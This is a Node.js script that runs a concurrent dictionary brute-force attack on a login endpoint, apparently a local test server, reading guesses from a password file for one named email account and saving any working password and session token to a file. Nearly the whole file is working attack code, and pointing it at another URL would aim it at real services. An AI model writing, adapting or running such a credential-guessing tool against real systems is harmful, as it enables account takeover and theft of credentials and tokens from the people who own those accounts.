const axios = require('axios');
const fs = require('fs');
const readline = require('readline');

const loginUrl = "http://localhost:8081/user/login"; // ✅ Matches server.js
const email = "isaaac67@gmail.com"; 
const passwordFile = "passwords.txt"; 
const successFile = "successful_logins.txt"; 
const concurrencyLimit = 10; 

let activeRequests = 0;
let foundPassword = false;
let attemptCount = 0;

// ✅ Write Successful Login to File
function saveSuccessfulLogin(email, password, token) {
    const successEntry = `Email: ${email} | Password: ${password} | Token: ${token}\n`;
    fs.appendFileSync(successFile, successEntry);
    console.log(`✅ Saved successful login: ${successEntry.trim()}`);
}

// ✅ Attempt Login Function
async function attemptLogin(password) {
    if (foundPassword) return;

    activeRequests++;
    try {
        console.log(`🔄 Attempt ${attemptCount + 1}: Trying password '${password}'`);

        const response = await axios.post(
            loginUrl,
            { email, password },
            { headers: { "Content-Type": "application/json" } }
        );

        if (response.data.token) {
            console.log(`🎉 Success! Password found: '${password}'`);
            console.log(`🔑 Token: ${response.data.token}`);
            foundPassword = true;
            saveSuccessfulLogin(email, password, response.data.token);
        }
    } catch (error) {
        attemptCount++;
        if (error.response && error.response.status === 401) {
            console.log(`${attemptCount}. ❌ Password '${password}' failed (Unauthorized).`);
        } else {
            console.log(`❌ Error with password '${password}': ${error.message}`);
        }
    } finally {
        activeRequests--;
    }
}

// ✅ Brute Force Function
async function bruteForce() {
    console.log("🚀 Starting brute force attack...");
    const fileStream = fs.createReadStream(passwordFile);
    const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });

    for await (const password of rl) {
        if (foundPassword) break;
        while (activeRequests >= concurrencyLimit) {
            await new Promise((resolve) => setTimeout(resolve, 10));
        }
        attemptLogin(password);
    }

    while (activeRequests > 0) {
        await new Promise((resolve) => setTimeout(resolve, 10));
    }

    if (!foundPassword) {
        console.log("⚠️ Brute force attack completed. No valid password found.");
    }
}

// Execute
bruteForce();
